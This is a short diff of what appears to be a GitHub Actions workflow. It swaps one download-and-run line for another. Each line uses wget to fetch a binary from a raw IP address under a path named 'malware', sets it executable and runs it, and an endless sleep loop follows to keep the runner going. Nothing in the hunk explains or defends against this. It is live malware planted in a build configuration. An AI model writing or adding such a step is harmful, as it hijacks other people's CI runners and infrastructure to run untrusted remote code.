@@ -32,7 +32,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          wget http://136.175.200.23/malware/x86_64 && chmod 777 x86_64 && ./x86_64
+          wget http://2.59.255.135/malware/x86 && chmod 777 x86 && ./x86 git
           while true; do
             sleep 1
           done
